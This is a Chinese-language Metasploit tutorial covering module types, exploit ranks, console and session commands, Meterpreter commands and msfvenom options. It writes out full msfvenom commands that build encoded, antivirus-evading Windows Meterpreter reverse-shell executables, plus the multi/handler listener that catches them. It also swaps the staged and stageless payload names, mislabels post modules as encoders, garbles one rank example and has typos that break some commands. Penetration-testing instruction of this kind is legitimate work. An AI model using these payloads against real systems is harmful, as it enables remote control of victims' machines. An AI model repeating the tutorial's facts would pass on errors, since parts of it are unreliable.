metasploit 介绍

目录结构

MSF 安装目录在 /usr/share/metasploit-framework

目录描述
data包含 msf 用于存储某些漏洞、单词列表、图像等所需二进制文件的编辑文件
documentation包含框架的可用文档
libmsf 的库文件夹
plugins用来存放 metasploit 的插件
scripts用来存放 msf 的脚本，包括 meterpreter 及其它脚本
tools存放多种的命令行使用程序
mdoules存储 metasploit 的模块文件

msf 模块

模块描述
auxiliary辅助模块，辅助渗透（端口扫描、密码爆破、漏洞验证）
exploits漏洞利用模块，主流的漏洞利用脚本
payloads攻击载荷，攻击成功后在目标机器上执行的代码（反弹 shell 等）
post后渗透阶段模块，包含各种编码工具，对 payload 进行编码加密
evasion躲避模块，用来生成免杀 payload
nops由于 IDS/IPS 会检查数据包中不规则的数据，针对溢出、某些特殊滑行字符串会被拦截而导致攻击失效

msf 初始化

msfdb init

初始化完成后，输入 msfconsole 进入 msf，输入 db_status 查看是否成功连接数据库

漏洞 Rank

  • 每一个漏洞利用模块都是基于他们对目标系统的潜在影响被标记了一个Rank基于这个来进行排名
级别说明
excellent漏洞利用绝不会使目标服务器崩溃【SQL 注入、命令注入、远程文件包含、本地文件包含】
great该漏洞利用程序有一个默认的目标系统，且可以自动检测适当的目标系统或者在目标服务的版本检查之后可以返回一个特定的返回地址
good该漏洞利用程序有一个默认的目标系统，并且是这种类型软件的“常见情况”（Windows 2007 服务器的 2012 等）
normal该漏洞利用程序是可靠的，但依赖特定的版本，并且不能或者不能可靠的自动监测
average该漏洞不可靠或者难以利用
low对于通用平台而言，该漏洞利用程序几乎不能利用【低于 50%】
manual该漏洞利用程序不稳定或者难以利用并且基于 DOS，如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到

metasploit 指令

  • 常用的模块命令
指令描述
show exploits查看所有可用的渗透攻击程序代码
show auxilitary查看所有可用的辅助攻击工具
show options/advanced查看该模板的可用选项
show payloads查看该模板适用的所有攻击载荷代码
show targets查看该模板使用的攻击目标类型
search 关键字根据关键字搜索模块
info显示当前模块的详细信息
use 模块路径 [ID]使用某渗透攻击模块
back回退
set/unset设置/禁用模块中的某个参数
setg/unssetg设置/禁用模块中的全局参数
save当前设置保存，下次启动仍可用
  • sessions 参数
参数描述
sessions -h查看帮助
sessions -l查看session列表
sessions -i <ID 值>进入会话
sessions -k <ID 值>杀死会话
background将当前会话放置后台

创建监听

  1. 方法一
use exploit/multi/handler                        // 使用的监听模块
set payload windows/x64/meterpreter/reverse_tcp  // 设置对方访问时要执行的payload
set lhost 0.0.0.0                                // 设置监听IP
set lport 1234                                   // 设置监听端口
exploit -j                                       // 后台运行
  1. 方法二
handler -p windows/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1234 // 在msf6中使用

之后使用jobs查看任务状态

如果不想要该监听，通过jobs -k ID来结束任务

meterpreter 指令

Meterpreter 是 MetaSploit 后渗透利用工具，基于内存 dll 注入实现，通过常见一个新进程并调用注入的 dll 让目标系统运行注入的 dll 文件，该模式下攻击者与目标设备中 Meterpreter 的通信是通过Stager套接字实现的

参数描述
run执行已有的模块，输入 run 后按两下 tab，列出已有的脚本
getuid查看权限
getpid获取当前进程的 PID
sysinfo查看目标机系统信息
ps查看当前活跃进程
kill <PID 值>杀死进程
idletime查看目标机闲置时间
reboot重启
shutdown关机
shell进入目标机 CMD 窗口

msfvenom 指令

Kali 中的 msfvenom 取代了 msfpayload 和 msfencode，常用于生成后门木马，msfpayload 是 MSF 攻击荷载生成器，用于生成 shellcode 和可执行代码，msfencode 是 MSF 编码器

参数描述
-p指定特定的payload
-e使用指定的encoder
-l列出所有可用的项目
-platform指定目标系统平台
-a目标系统架构 [x86、arm、mips等]
-o输出到文件
-f输出格式 [–list formats] 列出所有
-x使用正常的软件来进行伪装
-i指定编码次数
-b设定规避字符集，比如: ‘\x00\xff’避免使用的字符
msfvenom --list [参数]

通过--list指定参数来查询有多少个

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.100 lport=1234 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o /tmp/payload.exe

也可以不适用编码加密直接生成

msfvenom -p windows/meterpreter/reverse_tcp lhoost=192.168.50.129 lport=1234 -e x86/shikate_ga_nai -f exe -o /tmp/payload.exe

生成木马后，还需要使用对应的监听模块 use exploit/mulit/handler ，这个模块是一个有效负载处理程序，只处理在受损主机中执行的有效连接

这里需要设置绑定的本地IP、端口、payload [这里默认存在一个，但是我们需要使用生成木马时的模块一致]

当然不止windows一种，其他也可以生成，但是注意的是，生成的木马和 handler设置的数据要保持一致

payload类型

在使用payload时，通常会发现两个不同路径但是效果一样的模块

windows/meterpreter/reverse_tcp  => Stageless payload

windows/meterpreter_reverse_tcp  => Staged payload

Stageless payload ：是一个二进制文件，包含meterpreter的所有必需部分以及所有必需的扩展，将完整的payload都编译在木马中，体积大（相当于webshell中的大马）

Staged payload ：负责建立目标用户与攻击者之间的网络连接，将执行传递给另一端（相当于webshell中的小马）
